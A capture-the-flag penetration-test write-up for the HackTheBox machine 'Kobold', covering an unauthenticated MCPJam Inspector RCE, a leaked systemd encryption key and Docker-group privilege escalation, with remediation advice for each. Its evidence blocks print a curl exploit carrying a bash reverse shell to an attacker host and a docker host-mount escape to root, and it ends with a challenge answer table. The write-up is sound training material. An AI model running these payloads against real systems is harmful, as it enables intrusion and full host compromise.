# Penetration Test Report — Kobold
**Platform:** HackTheBox
**Difficulty:** Medium
**Category:** Linux — AI Tooling Misconfiguration, Container Escape
**Author:** D24yK4r4
**Target:** kobold.htb

---

## Executive Summary

Kobold is a medium-rated Linux machine built around a realistic attack chain targeting modern AI tooling and container security misconfigurations. An MCPJam Inspector instance exposed on a public subdomain contained an unauthenticated Remote Code Execution vulnerability (CVE-2026-23744) in its `/api/mcp/connect` endpoint, where the `command` field is passed directly to Node.js `child_process.spawn()` without sanitisation or authentication. This provided an initial shell as user `ben`. Post-exploitation enumeration revealed a dormant Docker group membership activatable via `newgrp`, which was exploited to mount the host filesystem into a privileged container and read both flags.

**Overall Risk: Critical**

---

## Scope & Methodology

**Target:** `https://kobold.htb/`
**Approach:** Black-box
**Tools used:** Nmap, Gobuster, curl, Netcat

**Methodology:**
1. Full TCP port scan and service identification
2. Virtual host enumeration via wildcard TLS SAN
3. CVE-2026-23744 exploitation — unauthenticated RCE via MCPJam Inspector
4. Post-login enumeration — network services, processes, group membership
5. Privilege escalation via Docker group abuse and container filesystem mount

---

## Findings

---

### F-01 — Unauthenticated RCE in MCPJam Inspector (CVE-2026-23744)

**Severity:** Critical
**CVE:** CVE-2026-23744 (GHSA-232v-j27c-5pp6)
**CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Classification:** CWE-78 — Improper Neutralisation of Special Elements used in an OS Command
**OWASP:** A03:2021 — Injection

**Description:**
The MCPJam Inspector is a developer tool for testing Model Context Protocol servers. When the `/api/mcp/connect` endpoint is exposed without authentication, the `serverConfig.command` field in the JSON request body is passed directly to Node.js `child_process.spawn()` with no input validation. Any unauthenticated attacker can supply an arbitrary OS command, achieving remote code execution as the user running the Node.js process.

Nmap identified a wildcard SAN (`*.kobold.htb`) on the TLS certificate of port 443, indicating multiple virtual hosts. Gobuster vhost enumeration confirmed `mcp.kobold.htb` (MCPJam Inspector) and `bin.kobold.htb` (PrivateBin 2.0.2). The MCPJam Inspector API accepted unauthenticated requests and executed the supplied command immediately.

**Evidence:**
```bash
nmap -sC -sV -p- -T4 --min-rate 5000 REDACTED
# 22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
# 80/tcp   open  http     nginx 1.24.0 — redirect to https://kobold.htb/
# 443/tcp  open  ssl/http nginx 1.24.0 — SAN: *.kobold.htb
# 3552/tcp open  http     Golang net/http (GetArcane Docker manager)

gobuster vhost -u https://kobold.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -k
# Found: mcp.kobold.htb  (Status: 200)
# Found: bin.kobold.htb  (Status: 200)

# Set up listener
nc -lvnp 4444

# Fire exploit
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/REDACTED/4444 0>&1"],
      "env": {}
    }
  }'
```

```
listening on [any] 4444 ...
connect to [REDACTED] from (UNKNOWN) [REDACTED] 34924
bash: cannot set terminal process group (1532): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$

ben@kobold:~$ cat /home/ben/user.txt
REDACTED
```

**Impact:**
Full unauthenticated remote code execution as user `ben`. Direct enabler for all subsequent post-exploitation activity.

**Remediation:**
Restrict access to the MCPJam Inspector API behind authentication. Never expose MCP inspector instances to public or untrusted networks. Implement input validation on `serverConfig.command` — whitelist allowed binaries. Run MCPJam Inspector as a non-privileged user with no network access by default.

---

### F-02 — Encryption Key Leaked in Systemd Service Unit File

**Severity:** Medium
**CVSS:** 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**Classification:** CWE-312 — Cleartext Storage of Sensitive Information
**OWASP:** A02:2021 — Cryptographic Failures

**Description:**
The GetArcane Docker management service (`/root/arcane_linux_amd64`) is configured via a systemd unit file readable by all local users. The unit file contains the application's `ENCRYPTION_KEY` as a plaintext inline `Environment=` directive. Any local user with shell access can read this value and use it to authenticate to the GetArcane panel running on port 3552.

**Evidence:**
```bash
cat /etc/systemd/system/arcane.service
```

```ini
[Service]
Type=simple
Environment=ENCRYPTION_KEY="REDACTED"
ExecStart=/root/arcane_linux_amd64
User=root
```

**Impact:**
An attacker with local shell access can extract the encryption key and authenticate to the GetArcane Docker management panel, obtaining an alternative path to container and host compromise.

**Remediation:**
Move secrets out of systemd unit files. Use an `EnvironmentFile=` directive pointing to a root-owned file with mode `600` instead of inline `Environment=` directives. Consider a secrets manager for production deployments.

---

### F-03 — Local Privilege Escalation via Docker Group Abuse

**Severity:** Critical
**CVSS:** 8.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
**Classification:** CWE-269 — Improper Privilege Management
**OWASP:** A05:2021 — Security Misconfiguration

**Description:**
User `ben` could activate the `docker` group via `newgrp docker` without a password, despite the group appearing empty in `/etc/group`. This is a PAM-level misconfiguration. Membership in the Docker group is functionally equivalent to unrestricted root access: Docker can create containers running as root with arbitrary host filesystem paths mounted inside. A single `docker run` command with `-v /:/mnt` mounts the entire host filesystem into the container, providing read and write access to every file on the host — including `/root/root.txt`.

**Evidence:**
```bash
# Activate docker group
newgrp docker

id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

docker ps
# 4c49dd7bb727  privatebin/nginx-fpm-alpine:2.0.2  Up 45 min  127.0.0.1:8080->8080/tcp  bin

# Container escape — mount host / into container
docker run -i --rm --user root --entrypoint /bin/sh \
  -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

```
/var/www # id
uid=0(root) gid=0(root) groups=0(root)

/var/www # cat /mnt/root/root.txt
REDACTED
```

**Impact:**
Full host compromise from a local user shell. Unrestricted read and write access to all files on the host filesystem, including root-owned files, SSH keys, shadow password files, and application secrets.

**Remediation:**
Treat Docker group membership as equivalent to root — audit all members immediately via `grep docker /etc/group`. Remove `ben` from the Docker group unless strictly required. Audit PAM configuration to prevent unauthorised `newgrp` escalation for security-sensitive groups. Consider rootless Docker (`dockerd-rootless`) or Podman to prevent container escapes from affecting the host. Enable `--userns-remap` to map container root to an unprivileged host user.

---

## Findings Summary

| ID | Title | Severity | CVE | CWE | OWASP |
|----|-------|----------|-----|-----|-------|
| F-01 | Unauthenticated RCE — MCPJam Inspector | Critical | CVE-2026-23744 | CWE-78 | A03:2021 |
| F-02 | Encryption Key in Systemd Unit File | Medium | — | CWE-312 | A02:2021 |
| F-03 | Privilege Escalation via Docker Group | Critical* | — | CWE-269 | A05:2021 |

*Critical only in combination with prior local access.

---

## Answers

| Question | Answer |
|----------|--------|
| Open ports | `22 (SSH), 80 (HTTP), 443 (HTTPS), 3552 (GetArcane)` |
| Discovered subdomains | `mcp.kobold.htb, bin.kobold.htb` |
| Service on mcp.kobold.htb | `MCPJam Inspector` |
| CVE used for initial access | `CVE-2026-23744` |
| Vulnerable API endpoint | `/api/mcp/connect` |
| Initial shell user | `ben` |
| Group abused for privesc | `docker` |
| Command to activate group | `newgrp docker` |
| Docker flag used to mount host | `-v /:/mnt` |
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

---

*HackTheBox — Kobold — D24yK4r4*
